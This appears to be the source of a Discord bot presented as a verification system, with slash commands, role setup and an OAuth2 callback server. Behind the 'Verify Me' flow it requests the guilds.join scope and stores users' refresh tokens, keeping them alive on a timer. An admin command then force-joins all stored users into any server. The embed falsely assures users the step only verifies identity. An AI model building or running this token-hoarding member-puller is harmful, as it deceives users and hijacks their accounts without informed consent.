const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const express = require('express');
const axios = require('axios');
require('dotenv').config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
  ]
});

const TOKEN = process.env.TOKEN;
const CLIENT_ID = '1426995257609814209';
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = 'https://verifyme-eakq.onrender.com/callback';
const VERIFY_CHANNEL_ID = '1454952975171719352';
const UNVERIFIED_ROLE_NAME = 'Unverified';
const VERIFIED_ROLE_NAME = 'Verified';
const ADDITIONAL_ROLE_ID = '';

const pendingVerifications = new Map();
const users = new Map();

const app = express();
app.enable('trust proxy');

async function refreshToken(userId) {
  const userData = users.get(userId);
  if (!userData) return null;

  if (Date.now() < userData.expires_at) return userData.access_token;

  const response = await axios.post('https://discord.com/api/oauth2/token',
    new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: 'refresh_token',
      refresh_token: userData.refresh_token
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );

  const { access_token, refresh_token, expires_in } = response.data;

  users.set(userId, {
    ...userData,
    access_token,
    refresh_token,
    expires_at: Date.now() + (expires_in * 1000)
  });

  return access_token;
}

async function addToGuild(userId, guildId) {
  const token = await refreshToken(userId);
  if (!token) return console.log(`No token for user ${userId}`);

  await axios.put(
    `https://discord.com/api/guilds/${guildId}/members/${userId}`,
    { access_token: token },
    { headers: { Authorization: `Bot ${TOKEN}` } }
  );
}

setInterval(async () => {
  for (const [userId, userData] of users) {
    try {
      await refreshToken(userId);
      await new Promise(r => setTimeout(r, 500));
    } catch (err) {
      users.delete(userId);
    }
  }
}, 5 * 24 * 60 * 60 * 1000);

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'setup-verify') {
    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'You need Administrator permission to use this command.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    try {
      const guild = interaction.guild;

      let unverifiedRole = guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
      if (!unverifiedRole) {
        unverifiedRole = await guild.roles.create({
          name: UNVERIFIED_ROLE_NAME,
          color: 0x808080,
          reason: 'Verification system setup'
        });
      }

      let verifiedRole = guild.roles.cache.find(r => r.name === VERIFIED_ROLE_NAME);
      if (!verifiedRole) {
        verifiedRole = await guild.roles.create({
          name: VERIFIED_ROLE_NAME,
          color: 0x00FF00,
          reason: 'Verification system setup'
        });
      }

      const everyoneRole = guild.roles.everyone;
      const channels = guild.channels.cache.filter(c => c.type !== ChannelType.GuildCategory);

      for (const [, channel] of channels) {
        if (channel.id === VERIFY_CHANNEL_ID) {
          await channel.permissionOverwrites.edit(everyoneRole, { ViewChannel: false });
          await channel.permissionOverwrites.edit(unverifiedRole, { ViewChannel: true, SendMessages: false, ReadMessageHistory: true });
          await channel.permissionOverwrites.edit(verifiedRole, { ViewChannel: true });
          continue;
        }

        await channel.permissionOverwrites.edit(everyoneRole, { ViewChannel: false });
        await channel.permissionOverwrites.edit(unverifiedRole, { ViewChannel: false });
        await channel.permissionOverwrites.edit(verifiedRole, { ViewChannel: true });
      }

      await interaction.editReply('✅ Verification system setup complete! Use `/send-verify` to send the verification message.');
    } catch (error) {
      console.error(error);
      await interaction.editReply('❌ An error occurred during setup.');
    }
  }

  if (interaction.commandName === 'send-verify') {
    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'You need Administrator permission to use this command.', ephemeral: true });
    }

    const button = new ButtonBuilder()
      .setCustomId('verify_button')
      .setLabel('Verify Me')
      .setStyle(ButtonStyle.Success)
      .setEmoji('✅');

    const row = new ActionRowBuilder().addComponents(button);

    const embed = {
      color: 0x5865F2,
      title: '🛡️ Server Verification',
      description: 'Welcome to the server! To gain access to all channels, please complete the verification process below.',
      fields: [
        { name: '📋 What happens next?', value: 'Click the **Verify Me** button below to authorize with Discord and gain full server access.', inline: false },
        { name: '🔒 Is this safe?', value: 'Yes! This uses Discord\'s official OAuth2 system to verify your identity.', inline: false }
      ],
      footer: { text: 'Verification is required to access all channels' },
      timestamp: new Date().toISOString()
    };

    await interaction.reply({ content: 'Verification message sent!', ephemeral: true });
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }

  if (interaction.commandName === 'add-to-server') {
    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'You need Administrator permission.', ephemeral: true });
    }

    const guildId = interaction.options.getString('serverid');
    await interaction.deferReply({ ephemeral: true });

    let added = 0;
    let failed = 0;

    for (const [userId] of users) {
      try {
        await addToGuild(userId, guildId);
        added++;
        await new Promise(r => setTimeout(r, 500));
      } catch (err) {
        failed++;
      }
    }

    await interaction.editReply(`✅ Done! Added: ${added} | Failed: ${failed}`);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'verify_button') {
    const member = interaction.member;
    const guild = interaction.guild;

    const unverifiedRole = guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
    const verifiedRole = guild.roles.cache.find(r => r.name === VERIFIED_ROLE_NAME);

    if (!unverifiedRole || !verifiedRole) {
      return interaction.reply({ content: '❌ Roles not set up properly. Ask an admin to run `/setup-verify`.', ephemeral: true });
    }

    if (member.roles.cache.has(verifiedRole.id)) {
      return interaction.reply({ content: '✅ You are already verified!', ephemeral: true });
    }

    const state = `${member.id}_${guild.id}_${Date.now()}`;
    pendingVerifications.set(state, {
      userId: member.id,
      guildId: guild.id,
      timestamp: Date.now()
    });

    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${state}`;

    const authorizeButton = new ButtonBuilder()
      .setLabel('Authorize')
      .setStyle(ButtonStyle.Link)
      .setURL(authUrl);

    const row = new ActionRowBuilder().addComponents(authorizeButton);

    await interaction.reply({
      content: '**Complete Verification**\n\nClick the button below to open Discord\'s authorization page.',
      components: [row],
      ephemeral: true
    });

    setTimeout(() => {
      if (pendingVerifications.has(state)) {
        pendingVerifications.delete(state);
      }
    }, 600000);
  }
});

app.get('/', (req, res) => {
  res.send('✅ Verification server is running!');
});

app.get('/callback', async (req, res) => {
  const { code, state } = req.query;

  if (!code || !state) {
    return res.send('❌ Authorization failed: Missing parameters');
  }

  const verification = pendingVerifications.get(state);
  if (!verification) {
    return res.send('❌ Authorization failed: Invalid or expired verification request');
  }

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: REDIRECT_URI
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const { access_token, refresh_token, expires_in } = tokenResponse.data;

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const user = userResponse.data;

    if (user.id !== verification.userId) {
      pendingVerifications.delete(state);
      return res.send('❌ Authorization failed: User ID mismatch');
    }

    const guild = client.guilds.cache.get(verification.guildId);
    if (!guild) {
      pendingVerifications.delete(state);
      return res.send('❌ Authorization failed: Server not found');
    }

    const member = await guild.members.fetch(verification.userId).catch(() => null);
    if (!member) {
      pendingVerifications.delete(state);
      return res.send('❌ Authorization failed: Member not found');
    }

    users.set(user.id, {
      username: user.username,
      access_token,
      refresh_token,
      expires_at: Date.now() + (expires_in * 1000)
    });

    const unverifiedRole = guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
    const verifiedRole = guild.roles.cache.find(r => r.name === VERIFIED_ROLE_NAME);

    if (unverifiedRole && member.roles.cache.has(unverifiedRole.id)) {
      await member.roles.remove(unverifiedRole);
    }
    if (verifiedRole) {
      await member.roles.add(verifiedRole);
    }

    if (ADDITIONAL_ROLE_ID && ADDITIONAL_ROLE_ID.trim() !== '') {
      const additionalRole = guild.roles.cache.get(ADDITIONAL_ROLE_ID);
      if (additionalRole) await member.roles.add(additionalRole);
    }

    pendingVerifications.delete(state);

    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Verification Successful</title>
        <style>
          body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #36393f; color: #dcddde; }
          .container { text-align: center; padding: 40px; background: #2f3136; border-radius: 8px; }
          h1 { color: #43b581; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>✅ Verification Successful!</h1>
          <p>You have been verified as <strong>${user.username}</strong></p>
          <p>You now have access to all channels in <strong>${guild.name}</strong></p>
          <p>You can close this window and return to Discord.</p>
        </div>
      </body>
      </html>
    `);

  } catch (error) {
    console.error('OAuth error:', error.response?.data || error.message);
    pendingVerifications.delete(state);
    res.send('❌ Authorization failed: An error occurred during verification');
  }
});

client.on('guildMemberAdd', async member => {
  const unverifiedRole = member.guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
  if (unverifiedRole) {
    try {
      await member.roles.add(unverifiedRole);
    } catch (error) {
      console.error('Error assigning role:', error);
    }
  }
});

app.listen(3000, () => {
  console.log('OAuth server running on port 3000');
});

client.login(TOKEN);
